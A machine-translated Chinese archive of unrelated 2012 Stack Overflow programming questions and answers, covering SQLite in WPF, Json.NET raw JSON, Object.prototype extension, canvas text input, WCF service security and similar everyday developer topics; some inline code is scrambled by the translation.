## 回答 #1

> 赞同：0
> 
> 时间：2012-05-25T15:48:00.020

尝试使用

```
[[UIApplication sharedApplication] beginIgnoringInteractionEvents]; 
```

和

```
[[UIApplication sharedApplication] endIgnoringInteractionEvents]; 
```

反而。

虽然这会禁用整个应用程序的用户交互，但它可能不是适合您的解决方法。

# c# - SQLite 未正确初始化数据库

> ID：10757446
> 
> 赞同：0
> 
> 时间：2012-05-25T15:44:02.123
> 
> 标签：c#, wpf, database, sqlite, exception

我的目标是，在将邮政编码或区号输入文本框中时，另一个文本框应显示该邮政编码/区号的城市和州。我确实有一种方法可以使用两个`Dictionaries`，但它在开始时有大约 15 秒的借出时间，并导致大约 10 倍的 RAM 使用量。不是最好的解决方案。所以我尝试使用数据库文件，使用 SQLite。一切都在开发计算机上完美运行，但是在将其转移到其他机器时，我遇到了几个不同的错误。

第一个是“无法找到 sqlite3.dll”，我想我已经修复了，但直到今天开始工作才能确定。但我也在我孩子的电脑和妻子的笔记本电脑上试过，因为他们都没有安装 sqlite。

我收到的异常之一是它无法打开数据库。这是我妻子的笔记本电脑，她安装了我相信使用 sqlite 的 iTunes，所以她可能已经有 dll 文件。

另一个（在孩子的电脑上）说桌子`ZipCodes`不存在。

我已经粘贴了下面的表初始化，大部分是在我添加 DataSet 时由 VS 自动生成的。至于文件，我在计算机之间传输的文件夹中包含的文件是`Locations.db3`、`System.Data.SQLite.dll`和`System.Data.SQLite.Linq.dll`。我正在使用最新版本的 SQLite，它是为 .NET 4.0 和 x64 设计的包。

我已经到处寻找帮助，并且认真对待我愿意坚持更长的加载时间的地步。

```
public void InitializeDB()
    {
        try
        {
            locationsDataSet = ((LocationsDataSet)App.Current.MainWindow.FindResource("locationsDataSet"));

            locationsDataSetZipCodesTableAdapter = new LocationsDataSetTableAdapters.ZipCodesTableAdapter();
            locationsDataSetAreaCodesTableAdapter = new LocationsDataSetTableAdapters.AreaCodesTableAdapter();

            locationsDataSetZipCodesTableAdapter.Fill(locationsDataSet.ZipCodes);
            locationsDataSetAreaCodesTableAdapter.Fill(locationsDataSet.AreaCodes);

            zipCodesViewSource = ((CollectionViewSource)(this.FindResource("zipCodesViewSource")));
            areaCodesViewSource = ((CollectionViewSource)(this.FindResource("areaCodesViewSource")));

            zipCodesViewSource.View.MoveCurrentToFirst();
            areaCodesViewSource.View.MoveCurrentToFirst();
        }
        catch (Exception ex)
        {
            MessageBox.Show("Database failed to load with exception " + ex.ToString());
        }
    } 
```

**XAML**

```
<Window.Resources>
    <main:LocationsDataSet x:Key="locationsDataSet" />
    <CollectionViewSource x:Key="areaCodesViewSource" Source="{Binding Path=AreaCodes, Source={StaticResource locationsDataSet}}" />
    <CollectionViewSource x:Key="zipCodesViewSource" Source="{Binding Path=ZipCodes, Source={StaticResource locationsDataSet}}" />
</Window.Resources> 
```

# php - SQL 查询主从样式

> ID：10757449
> 
> 赞同：0
> 
> 时间：2012-05-25T15:44:19.270
> 
> 标签：php, mysql, sql

我正在开发一个 php+jquery 手机应用程序。我遇到的困难在于 SQL 数据库调用。我已成功连接到 Joomla 数据库。我检索了简单的信息，例如表格列表。我想要做什么，我需要什么：来自特定类别的数据列表..(jos_content) 将受到部分 id 和状态的限制。

```
$st = $db->prepare("SELECT * FROM `jos_content` WHERE state=1 and sectionid=6"); 
```

这行得通。这将返回一个小列表，我可以对其进行排序和过滤以获取最新的文章条目。但是，我想在选择此条目时显示另一个选择语句。我有它导航到另一个页面的位置，但是我如何关联这两个语句？

所以，你得到一个列表*（1 项的列表）*作为特色文章然后单击它会将您带到文章。并将显示img、文本和作者和日期。

任何帮助都是极好的。我只是在慢慢学习这个 SQL 数据库的东西。

最好的，科里

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-25T15:58:05.000

我对您所说的“我想在选择此条目时显示另一个选择语句”的意思感到困惑。如果我理解正确，您将需要使用从您显示的 SELECT 语句中检索到的列来构建 URL

# .net - 在 Newtonsoft.Json 库中获取原始 json 字符串

> ID：10757450
> 
> 赞同：15
> 
> 时间：2012-05-25T15:44:22.280
> 
> 标签：.net, json, json.net

我有这样的json

```
{
    "name": "somenameofevent",
    "type": "event",
    "data": {
        "object": {
            "age": "18",
            "petName": "18"
        },
        "desct": {
        }
    }
} 
```

我有两个这样的对象

```
public class CustEvent
{
    [JsonProperty("name")]
    public string Name { get; set; }
    [JsonProperty("type")]
    public string EventType{ get; set; }
    [JsonProperty("data")]
    public SomeData Data{ get; set; }
}

public class SomeData
{
    [JsonProperty("object")]
    public String SomeObject { get; set;}
    [JsonProperty("dsct")]
    public String SomeDesct { get; set; }
} 
```

我用来解析 json 对象 Newtonsoft.NET 库。以及如何将 RAW JSON 转换为 SomeObject 、 SomeDesct 属性？在 JSON 中，“data.object ...”是复杂对象，我只想获取这些属性的原始 JSON 字符串。你能帮助我吗 ？

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2015-12-08T07:14:51.767

**您不需要编写任何转换器，**只需使用[`JRaw`](http://www.newtonsoft.com/json/help/html/T_Newtonsoft_Json_Linq_JRaw.htm)如下类型：

```
public class SomeData
{
    [JsonProperty("object")]
    public JRaw SomeObject { get; set;}
    [JsonProperty("dsct")]
    public JRaw SomeDesct { get; set; }
} 
```

`.Value`然后您可以通过检查属性来访问原始值：

```
var rawJsonDesct = (string)data.SomeDesct.Value; 
```

如果要保留`string`签名，只需将 JSON 序列化为隐藏属性，然后在访问器调用中进行字符串转换。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-06-27T09:57:00.283

您必须编写一个自定义转换器类（派生自`Newtonsoft.Json.JsonConverter`），它指示反序列化器读取整个对象并返回该对象的 JSON 字符串。

然后你必须用属性来装饰`JsonConverter`属性。

```
[JsonConverter(typeof(YourCustomConverterClass))]
public string SomeObject { get; set; } 
```

网上有关于如何创建自定义转换器的很好的教程，但是 - 为了您的方便 - 您的转换器的核心可能如下所示：

```
public override object ReadJson(JsonReader reader, Type objectType, object existingValue, JsonSerializer serializer)
{
    return JObject.Load(reader).ToString();
} 
```

此方法读取完整的 JSON 对象，但将对象的序列化版本作为字符串返回。有一点开销，因为对象被反序列化为 a`JObject`然后再次序列化，但对我来说这是最简单的方法。也许你有更好的主意。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2014-12-05T08:13:16.313

我使用自定义 JsonConverter 的这个实现。

```
public class RawJsonConverter: JsonConverter
{
    public override bool CanConvert(Type objectType)
    {
        return objectType == typeof(string);
    }

    public override object ReadJson(JsonReader reader, Type objectType, object existingValue, JsonSerializer serializer)
    {
        var sb = new StringBuilder();
        JsonToken previousToken = JsonToken.None;

        if (reader.TokenType == JsonToken.StartObject)
        {
            sb.Append('{');
            int depth = 1;
            while (depth > 0)
            {
                if (!reader.Read())
                    break;
                switch (reader.TokenType)
                {
                    case JsonToken.PropertyName:
                        if (previousToken == JsonToken.Boolean || previousToken == JsonToken.Integer || previousToken == JsonToken.Float)
                            sb.Append(',');
                        sb.AppendFormat("\"{0}\":", reader.Value);
                        break;
                    case JsonToken.StartArray:
                        if (previousToken == JsonToken.EndArray)
                            sb.Append(',');
                        sb.Append('[');
                        break;
                    case JsonToken.Boolean:
                    case JsonToken.Integer:
                    case JsonToken.Float:
                        if (previousToken == JsonToken.Boolean || previousToken == JsonToken.Integer || previousToken == JsonToken.Float)
                            sb.Append(',');
                        sb.AppendFormat(System.Globalization.CultureInfo.InvariantCulture, "{0}", reader.Value);
                        break;
                    case JsonToken.EndArray:
                        sb.Append(']');
                        break;
                    case JsonToken.StartObject:
                        sb.Append('{');
                        depth++;
                        break;
                    case JsonToken.EndObject:
                        sb.Append('}');
                        depth--;
                        break;
                }
                previousToken = reader.TokenType;
            }
        }
        return sb.ToString();
    }

    public override void WriteJson(JsonWriter writer, object value, JsonSerializer serializer)
    {
        writer.WriteRawValue(value.ToString());
    }

    public override bool CanWrite
    {
        get
        {
            return true;
        }
    }
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-12-03T05:10:42.983

如果您担心开销因为对象被反序列`JObject`化为 a 然后再次序列化（**@fero 提供的解决方案**），那么您可以尝试以下操作。

**方法 1**：创建自己的自定义`JsonConverter`并覆盖`ReadJson`

```
using(var jsonReader = new JsonTextReader(myTextReader))
{
  while(jsonReader.Read()){
    if(jsonReader.TokenType.PropertyName=="SomeDesct")
    {
      //do what you want
    } 
  }
} 
```

有关更多详细信息，请查看链接[Incremental JSON Parsing in C#](https://stackoverflow.com/questions/9026508/incremental-json-parsing-in-c-sharp)

**方法 2**：读取 json 字符串并应用字符串函数或正则表达式函数来获取所需的字符串。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2018-03-01T16:31:02.243

正如[chakrit 所建议](https://stackoverflow.com/a/34150061/50358)的那样，您可以做这样的事情来为您的对象提供一个字符串签名，同时使用 JRaw 来完成真正的工作。

```
 [JsonProperty("Data")]
    public JRaw Raw { get; set; }

    [JsonIgnore]
    public string Data
    {
        get => Raw?.Value as string;
        set => Raw = new JRaw(value);
    } 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-01-14T10:10:20.850

在您的情况下，您可以直接使用 JsonConvert 类中的静态方法

> PopulateObject（字符串值，对象目标，JsonSerializerSettings 设置）；

# r - R包 - 我可以在包中使用全局变量吗？

> ID：10757451
> 
> 赞同：3
> 
> 时间：2012-05-25T15:44:24.167
> 
> 标签：r, function, global-variables, package

我正在 R 上制作一个包。我有两个函数共享一个变量（全局）。

如何将其导入包中？

例如，

```
m<-0
f<-function() { m <- m+1 }
g<-function() { m <- m-1 } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-25T15:52:48.903

是的，您可以导出变量，但您不必这样做。

您要查找的主题是“编写扩展”手册中的“包中的数据”。

# memory - 汇编程序中的块复制

> ID：10757453
> 
> 赞同：0
> 
> 时间：2012-05-25T15:44:31.970
> 
> 标签：memory, assembly, copy

我的项目 - RAM 速度测试实用程序。因此，我使用 MOVSD（作为具有最大块 DW 的 MOV）从一个源读取一些内存并写入另一个源。但是我得到的结果显示没有使用 RAM，而是使用了内存缓存，因为 DDR2 SDRAM 中的读/写速度为 768 MByte/s。

所以我需要80x86汇编程序中的指令或函数将大块移动到内存，溢出缓存和测试内存，而不是缓存测试。我使用 Assembler 是因为我不需要 C/C++ 所做的优化，我重写了不同的内存块，编译器可能认为它不需要，并破坏了我的测试。这就是为什么我不使用 memcpy 和其他人。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T16:24:16.443

移动比最大缓存大小更大的块，并确保`movntdq`用于写入和`movntdqa`读取。

# javascript - Object.prototype 是 Verboten 吗？

> ID：10757455
> 
> 赞同：20
> 
> 时间：2012-05-25T15:44:39.827
> 
> 标签：javascript, prototype

***回顾：***

好的，我已经有一段时间没有问这个问题了。像往常一样，我去增加了`Object.prototype`无论如何，尽管在这里和网络上的其他地方都有反对它的所有有效论据。我想我就是那种固执的混蛋。

我试图想出一个确凿的方法来防止新方法破坏任何预期的行为，这被证明是一件非常困难但内容丰富的事情。
我学到了很多关于 JavaScript 的东西。至少我不会尝试像弄乱本机原型那样鲁莽的事情（`String.prototype.trim`IE < 9 除外）。

在这种特殊情况下，我不使用任何库，所以冲突不是我主要关心的问题。但是，在使用原生原型时，我更深入地研究了可能出现的事故，我不太可能尝试将此代码与任何库结合使用。

通过研究这种原型方法，我对模型本身有了更好的理解。我将原型视为某种形式的灵活的传统抽象类，使我坚持传统的 OOP 思维。这种观点并没有真正做到原型模型公正。道格拉斯·克罗克福德 (Douglas Crockford) 写了关于这个陷阱的文章，可悲的是，粉红色的背景让我无法阅读全文。

我决定更新这个问题，因为阅读这篇文章的人很想亲眼看看。我只能说：无论如何，做。我希望你在决定放弃这个相当愚蠢的想法之前，像我一样学习一些简洁的东西。一个简单的函数可能同样有效，甚至更好，尤其是在这种情况下。毕竟，它真正的美妙之处在于，只需添加 3 行代码，您就可以使用相同的函数来增强特定对象的原型。

* * *

我知道我要问一个已经存在了很长一段时间的问题，但是：为什么 Object.prototype 被认为是*禁区*？它就在那里，并且可以像任何其他原型一样进行增强。那么，为什么不应该利用这一点。在我看来，只要你知道自己在做什么，就没有理由避开 Object 原型。
以这种方法为例：

```
if (!Object.prototype.getProperties)
{
    Object.prototype.getProperties = function(f)
    {
        "use strict";
        var i,ret;
        f = f || false;
        ret = [];
        for (i in this)
        {
            if (this.hasOwnProperty(i))
            {
                if (f === false && typeof this[i] === 'function')
                {
                    continue;
                }
                ret.push(i);
            }
        }
        return ret;
    };
} 
```

基本上，这是相同的旧`for...in`循环，您可以在函数中保持安全，或者一遍又一遍地编写。我知道它将被添加到**所有**对象中，并且由于 JavaScript 中几乎每个继承链都可以追溯到 . `Object.prototype`，但在我的脚本中，我认为它是两害相权取其轻。

[也许，有人可以比这个小伙子](http://erik.eae.net/archives/2005/06/06/22.13.54/)更好地告诉我我错在哪里，等等。
在寻找人们不去触摸 's 原型的原因*时*，`Object`一件事不断出现：它打破了`for..in`循环，但又一次：许多框架也这样做，更不用说你自己的继承链了。因此`.hasOwnProperty`，在我看来，在遍历对象的属性时不包括检查是不好的做法。

我也觉得[这](http://developer.appcelerator.com/question/129475/v8-runtime-defines-objectprototypeextend-which-may-break-compatibility-to-javascript-framework)很有趣。再说一遍：有一条评论非常明确：扩展原生原型是不好的做法，但如果 V8 人这样做，我还能说他们错了吗？
我知道，这个论点并不完全成立。

关键是：我真的看不出上面的代码有问题。我喜欢它，经常使用它，到目前为止，它没有让我失望过一次。我什至正在考虑将更多功能附加到对象原型。除非有人能告诉我为什么我不应该，否则就是这样。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-05-25T15:57:40.730

事实是，只要您知道自己在做什么以及成本是多少，就可以了。但这是一个**很大**的“如果”。一些费用示例：

*   您需要对您选择使用的*任何库进行***广泛的**测试，该库用于增强 的环境，因为压倒性的约定是空白对象没有可枚举的属性。通过向 中添加可枚举属性，您使该约定为假。例如，这是很常见的：*`Object.prototype``Object.prototype`*

     *```
    var obj = {"a": 1, "b": 2};
    var name;
    for (name in obj) {
        console.log(name);
    } 
    ```

    ...***压倒性***的约定是只有“a”和“b”会出现，而不是“getProperties”。* 
**   任何从事代码工作的人都必须接受这样的教育，即不遵守该约定（上图）。* 

 *如果支持，您可以通过使用（和类似的）来缓解上述`Object.defineProperty`问题，但请注意，即使在 2014 年，像 IE8[这样不](http://kangax.github.io/compat-table/es5/#Object.defineProperty)正确支持它的浏览器仍然在大量使用（尽管我们希望现在 XP 正式 EOL，这种情况会迅速改变'd）。那是因为使用`Object.defineProperty`，您可以添加**不可枚举**的属性（那些不会出现在`for-in`循环中的属性），因此您的麻烦会少很多（此时，您主要担心名称冲突） - 但它只是适用于正确实现的系统`Object.defineProperty`（并且正确的实现不能被“填充”）。

在您的示例中，我不会添加`getProperties`到`Object.prototype`; 我会将它添加到`Object`并接受该对象作为参数，就像 ES5 所做的那样`getPrototypeOf`。

请注意，Prototype 库因扩展而受到很多批评，`Array.prototype`因为它会影响`for..in`循环。这只是`Array`s （无论如何你都不应该使用`for..in`它（除非你正在使用`hasOwnProperty`警卫并且很可能`String(Number(name)) === name`也是如此）。

> ...如果 V8 的人这样做，我能说他们错了吗？

在 V8 上，您可以依赖[`Object.defineProperty`](http://ecma-international.org/ecma-262/5.1/#sec-15.2.3.6)，因为 V8 是一个完全符合 ES5 的引擎。

请注意，即使属性不可枚举，也存在问题。多年前，Prototype（间接）`filter`在`Array.prototype`. 它会如您所愿：调用迭代器函数并根据函数选择的元素创建一个新数组。然后 ECMAScript5 出现并被定义`Array.prototype.filter`为做同样的事情。但问题是：***大体相同***。特别是，被调用的迭代器函数的签名是不同的（ECMAScript5 包含一个 Prototype 没有的参数）。情况可能比这更糟（我怀疑——但无法证明——TC39 知道 Prototype 并有意避免与其发生过多冲突）。

所以：如果你打算这样做，请注意风险和成本。由于尝试使用现成的库而可能遇到的丑陋的边缘案例错误可能真的会花费你的时间......

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-25T16:00:02.813

如果框架和库通常按照您的建议进行，那么很快就会发生两个不同的框架将两个不同的功能定义为`Object`（或`Array`，`Number`...或任何现有对象原型）的相同方法。因此，最好将此类新功能添加到它自己的命名空间中。

例如......想象一下，您将有一个将对象序列化为 json 的库和一个将它们序列化为 XML 的库，并且两者都将它们的功能定义为

```
Object.prototype.serialize = function() { ... } 
```

而且您只能使用稍后定义的那个。所以最好他们不这样做，而是

```
JSONSerializingLibrary.seralize = function(obj) { ... }
XMLSerializingLibrary.seralize = function(obj) { ... } 
```

新功能也可能在新的 ECMAscript 标准中定义，或者由浏览器供应商添加。所以想象一下你的浏览器也会添加一个`serialize`功能。这将再次导致与定义相同功能的库发生冲突。即使这些库的功能与浏览器内置的功能相同，解释的脚本函数也会覆盖本机函数，这实际上会更快。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-25T16:20:24.397

请参阅[http://www.websanova.com/tutorials/javascript/extending-javascript-the-right-way](http://www.websanova.com/tutorials/javascript/extending-javascript-the-right-way)

这解决了一些（但不是全部）提出的反对意见。如果 Object.prototype 中已经存在特定于域的方法，则可以通过引发异常来缓解对不同库创建冲突方法的反对意见。当这种不良事件发生时，这至少会提供警报。

受这篇文章的启发，我开发了以下内容，这些内容也可以在引用页面的评论中找到。

```
!Object.implement && Object.defineProperty (Object.prototype, 'implement', {
  // based on http://www.websanova.com/tutorials/javascript/extending-javascript-the-right-way
  value: function (mthd, fnc, cfg) { // adds fnc to prototype under name mthd
      if (typeof mthd === 'function') { // find mthd from function source
        cfg = fnc, fnc = mthd;
        (mthd = (fnc.toString ().match (/^function\s+([a-z$_][\w$]+)/i) || [0, ''])[1]);
      }
      mthd && !this.prototype[mthd] && 
        Object.defineProperty (this.prototype, mthd, {configurable: !!cfg, value: fnc, enumerable: false});
    }
});

Object.implement (function forEach (fnc) {
  for (var key in this)
    this.hasOwnProperty (key) && fnc (this[key], key, this);
}); 
```

我主要使用它来在不支持它们的实现上添加标准定义的函数。*

# php - 在 Symfony2 中，我将多实体类保存在哪个文件夹中？

> ID：10757457
> 
> 赞同：1
> 
> 时间：2012-05-25T15:44:44.057
> 
> 标签：php, symfony, controller, entities

我是 Symfony2 的新手，我不确定应该在哪里保存更新多个表（实体）的类。

通过阅读文档和教程，它说我不应该在实体类中放置任何其他表引用；我可以把它放在控制器类中，但是很多人又说这个类应该尽可能简单，不包括业务逻辑；不在存储库中，因为它们用于查询数据而不是用于更新或插入。

是否有一个标准的文件夹结构，应该保存另一种用于处理多个实体（表）的类？业务逻辑真的应该存储在控制器类中吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T16:33:21.413

Symfony2 在这方面非常灵活。

没错，实体仅适用于一个“表”。

我建议您查看[Services](http://symfony.com/doc/current/book/service_container.html)，因为它们是将代码从控制器移动到单独类的好方法。您基本上调用您的服务并使用它提供的功能。这将使您的控制器瘦身。

# javascript - HTML5 Canvas 中的文本框值

> ID：10757458
> 
> 赞同：1
> 
> 时间：2012-05-25T15:44:45.433
> 
> 标签：javascript, html, canvas, html5-canvas

我正在开发一种使用 HTML5 Canvas 的名片制造商。获取自定义名称、地址等...我目前正在使用提示框...

现在我得到的是：

定义变量

```
var name = prompt("Votre nom","")
var address = prompt("Votre adresse","")
var title = prompt("Votre titre","") 
```

然后在画布中绘制它：

```
img.onload = function(){
oCtx.drawImage(img,0,0);

oCtx.font = "normal 25px arial";     // different font
oCtx.textBaseline = "top";           // text baseline at the top
oCtx.fillStyle = "#00529e";
oCtx.fillText(address, 283, 138);

oCtx.font = "bold 45px arial";     // different font
oCtx.fillText(name, 283, 350);

oCtx.font = "normal 40px arial";     // different font
oCtx.fillText(title, 283, 410);
};
img.src="back.png"; 
```

从提示框中获取价值非常有用。但我想做一些更清洁的事情，而不是用户文本框。

所以这个人只需要在 Canvas 旁边的文本框中输入，当他在文本框中输入时，它会自动更新“名称”变量的内容，或者“地址”或“标题”。

我怎样才能使这项工作？

* * *

编辑

这是我尝试过的……但这不起作用：

```
<input type="text" id="testing"/> 
```

我会在这个文本框中输入，然后会更新：

```
oCtx.fillText(document.getElementById('testing').value), 282, 138); 
```

现在，它是：

```
oCtx.fillText(address, 282, 138); 
```

谢谢

* * *

编辑 2

我试过了 ：

```
document.getElementById("testing").addEventListener("change", function() {
    var val = document.getElementById("testing").value;
    // now use val in your existing fillText code
}); 
```

“测试”是我的文本框的 ID ...我将 fillText 更改为：

```
oCtx.fillText(val, 282, 138); 
```

但是当我在文本框中输入时什么都没有发生……知道为什么吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-25T15:58:59.353

`keypress`在您的文本区域使用处理程序：

```
document.getElementById("mytextbox").addEventListener("keydown", function() {
    var val = document.getElementById("mytextbox").value;
    // now use val in your existing fillText code
}); 
```

请注意，您可以使用`change`事件而不是`keydown`事件，但`change`仅在用户将焦点从文本框移开后才会触发。该`keypress`事件的工作方式与 类似`keydown`，但不会捕获退格键。

那应该让你开始！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-08-16T09:06:37.377

一旦您从按键事件或任何您需要清除画布并重新绘制它的东西中获得新值。

所以

OCtx.clearRect ( x , y , w , h );

//用新值重新运行你最初使用的代码

# vb.net - 当流打开并且其中包含有效数据时，流读取返回长度 0

> ID：10757460
> 
> 赞同：0
> 
> 时间：2012-05-25T15:44:49.270
> 
> 标签：vb.net, stream, audio-converter

我有一点问题：在 VS2010 win 7 编译到 x86 的 winForm 应用程序中，我尝试做 Alvas.Audio 似乎可以工作的事情。请参阅（c# ex： [http](http://alvas.net/alvas.audio,tips.aspx#tip94) ://alvas.net/alvas.audio,tips.aspx#tip94 ）以供参考。

```
 Dim data() As Byte = wr.ReadData(second * i, second) 
```

结果给我`data.length()=0`。我没有任何例外，我可以从中读取格式，无论我使用什么阅读器，我都会遇到这个问题。

编辑：经过一些测试，我在第一步中创建的未压缩文件（PCM 格式，扩展名为 .wav）似乎无法被第二步的 Alvas.audio 库识别。我必须错过音频文件标记或类似的东西。

以下是可能是源代码（基本上这是第 1 步）：

```
 Dim functOut As String = String.Empty
    Dim wr As Alvas.Audio.IAudioReader = Nothing
    Dim fs As IO.FileStream = Nothing
    Dim i As Integer = 0
    Dim tmpData() As Byte = Nothing
    Dim dataPCM() As Byte = Nothing
    Dim newFormat As IntPtr = IntPtr.Zero
    Try
        Select Case IO.Path.GetExtension(filename).ToLower()
            Case ".wav"
                wr = New Alvas.Audio.WaveReader(IO.File.OpenRead(filename))
                filename = IO.Path.GetTempPath & IO.Path.GetFileNameWithoutExtension(filename) & "2" & IO.Path.GetExtension(filename)
            Case ".mp3"
                wr = New Alvas.Audio.Mp3Reader(IO.File.OpenRead(filename))
            Case Else : wr = New Alvas.Audio.DsReader(filename)
        End Select

        functOut = IO.Path.ChangeExtension(filename, ".wav")

        Dim format As IntPtr = wr.ReadFormat()
        Dim formatDetail As Alvas.Audio.WaveFormat = Alvas.Audio.AudioCompressionManager.GetWaveFormat(format)

        If formatDetail.wFormatTag = Alvas.Audio.AudioCompressionManager.MpegLayer3FormatTag Then
            Alvas.Audio.AudioCompressionManager.Mp3ToWav(filename, functOut)
            Return True
        Else
            IO.File.Create(functOut).Close()
            While True
                tmpData = wr.ReadData(SECONDS * i, SECONDS)
                If tmpData Is Nothing Or tmpData.Length = 0 Then Exit While

                If formatDetail.wBitsPerSample < 16 Then
                    Alvas.Audio.AudioCompressionManager.ToPcm16Bit(format, tmpData, newFormat, dataPCM)
                Else 
                    newFormat = format
                    dataPCM = tmpData
                End If

                formatDetail = Alvas.Audio.AudioCompressionManager.GetWaveFormat(newFormat)

                fs = IO.File.Open(filename, IO.FileMode.Append, IO.FileAccess.Write)
                Using ww As New Alvas.Audio.WaveWriter(fs, Alvas.Audio.AudioCompressionManager.FormatBytes(newFormat))
                    ww.Write(dataPCM, 0, dataPCM.Length())
                End Using

                i += 1
                tmpData = Nothing
            End While
            Return True
        End If

        wr.Close()
    Catch ex As Exception
        filename = String.Empty
        Throw ex
    Finally
        fs.Close()
        wr.Close()
        filename = functOut
        GC.Collect()
    End Try 
```

如何编写结果流以确保以后可以再次读取它？

任何想法将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T15:57:53.820

我找到了解决方案。

PCM 文件是无标题的。因此，当保存时，即使使用 waveWriter 并且该行`Alvas.Audio.AudioCompressionManager.FormatBytes(newFormat)`被忽略。

可以做两件事：

*   找一个能识别无头文件并允许读取的阅读器。

*   重构代码以解码为 PCM 文件并将其编码为新格式（例如 .mp3），而无需将结果文件写入文件系统（更好）

# wcf - 面向公众的服务器安全性上的内部 WCF 服务

> ID：10757463
> 
> 赞同：3
> 
> 时间：2012-05-25T15:45:05.570
> 
> 标签：wcf, web-services, security, iis

我需要托管一个 WCF 服务，该服务将允许其客户访问面向公众的 Web 服务器上的内部业务系统。显然，我必须确保这一点，以使外界甚至都不知道该服务的存在，更不用说能够调用方法和访问它公开的数据了。

总体思路是，托管在同一台机器上的面向公众的网站将调用 WCF 服务，然后 WCF 服务将为它提供所需的数据......

`Public Facing Web Site <-> WCF Service <-> Business Systems / Databases`

所以我需要了解如何保护服务，使其只能通过面向公众的网站访问。

我的想法..

*   IIS 筛选，以便承载 WCF 服务的 IIS 站点将只接受来自特定 IP 地址的请求。
*   不允许通过面向公众的防火墙的模糊端口。
*   协议，例如 NetTCP 或 NamedPipes

但是实际的 WCF 安全设置呢？由于面向公众的站点和服务都在同一台机器上，Windows 身份验证是选项吗？我对此的问题是......

*   服务客户端和服务是否应该简单地使用 Windows 身份验证？

*   我需要特定的用户帐户而不是网络服务吗？如果网站在网络服务下运行，这是否会自动对服务进行身份验证？

我的目标是外部世界的某个人不应该知道服务的存在或能够访问它。

提前致谢。

技术环境是：IIS7、.Net 4 和 WCF 4。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-02T08:46:25.160

我建议您创建一个 http 处理程序“.ashx”并将其用作客户端请求的端点。

如果您使用 asp.net，您可以通过使用简单表单身份验证并从请求标头中检索用户名和密码来对请求进行身份验证来保护它。

然后执行对您的业务 Web 服务的任何请求，这些请求也受到您的表单身份验证的保护。

干杯

# android - 在没有连接的情况下向手机广播数据包

> ID：10757465
> 
> 赞同：1
> 
> 时间：2012-05-25T15:45:17.350
> 
> 标签：android, ios, networking, wifi, broadcasting

这是一个奇怪的问题，但我知道这是可能的。

我正在尝试以特定频率广播数据包，并且我希望手机运行应用程序来接收这些数据包。手机不需要连接到任何网络即可执行此操作，只需打开 wifi 即可。广播设备不需要从手机获取任何信息，并且不需要保证每个数据包到手机的传送，就像 UDP 一样。

我从哪说起呢？这对于没有生根的手机是否可行。是否有某种 FCC 规定禁止这样做（在标准 wifi 频谱上）。

我知道这是可能的，因为这正是路由器告诉手机它们可以连接的方式。提前感谢您的任何意见。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-12-08T00:41:57.483

尽管可能存在类似的技术，但我对 iOS 开发并不熟悉。

**无根**

^(但需要 Android 上的粗粒度和/或细粒度位置权限)

您可以使用它[`WifiManager.getScanResults()`](http://developer.android.com/reference/android/net/wifi/WifiManager.html#getScanResults())来扫描无线路由器广播。

结果中包含网络“名称”(SSID) 和路由器 MAC 地址 (BSSID)。您可以广播这些数据包并将数据编码到这些字段中。

也就是说，我希望您的消息很短，因为每个数据包将获得 38 个字节（[32 个 SSID 字节](https://stackoverflow.com/q/4919889)+ 6 个 MAC 地址字节）。

^(是的，有些 MAC 地址是特殊的或无效的，但如果您只是广播而不实际使用它们，它们仍然可以传输数据。)

**有根**

根据无线芯片组和驱动程序的支持，您可以将设备置于“监控模式”，这样您就可以访问原始数据包数据。

主要缺点是没有官方支持。

[您可能会从Google 搜索](https://www.google.com/search?q=android+monitor+mode)中找到一些 hacky 方法来执行此操作，但我无法找到适用于所有（甚至大多数）设备的通用解决方案。

# vb.net - 在 WebMethod 中使用 CreateControlCollection()

> ID：10757467
> 
> 赞同：0
> 
> 时间：2012-05-25T15:45:20.047
> 
> 标签：vb.net, webmethod, controlcollection

我的代码调用了一个 WebMethod。在该 WebMethod 中，我需要创建一个新的控件集合。在VB中，我通常会写：

```
Dim cc As System.Web.UI.ControlCollection = CreateControlCollection() 
```

但是因为我在 WebMethod 中，所以我得到了错误：

```
Cannot refer to an instance member of a class from within a shared method or shared member initializer without an explicit instance of the class. 
```

请问有什么建议吗？谢谢各位！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-25T16:05:59.990

该错误消息暗示您正在尝试从共享方法访问实例级成员或方法。如果要从共享方法访问实例级方法或成员，首先必须使用 new 运算符创建实例，然后可以从那里访问其公共成员和方法。

# java - 我需要分隔一个整数，然后在java中将数字相加

> ID：10757470
> 
> 赞同：0
> 
> 时间：2012-05-25T15:45:36.553
> 
> 标签：java

早上好，我现在上第 4 课，但在使用循环时遇到了一些麻烦。请注意，我已经看到它使用字符串解决了，但我正在尝试掌握循环。

麻烦的原因是我需要显示两个答案：整数分解为单个数字例如：567 = 5 6 7

然后 567 = 18

我能够将整数加在一起，但不确定如何先将整数分开，然后再将各个数字加在一起。我在想我需要除以 0。例如，如果它是 5 位数字 /10000、/1000、/100、/10、/1

但是如果用户想做一个 6 位或 7 位甚至 8 位数字怎么办？

另外我假设这必须是第一个，然后添加单个整数？

感谢指导：

```
import java.util.Scanner;

public class spacing {

      public static void main(String[] args) {

            Scanner in = new Scanner(System.in);

            int n;

            System.out.print("Enter a your number: ");

            n = in.nextInt();   

                  int sum = 0;          

                  while (n != 0) {

                        sum += n % 10;

                        n /= 10;

                  }
                  System.out.println("Sum: " + sum);

        }
} 
```

* * *

## 回答 #1

> 赞同：5
> 
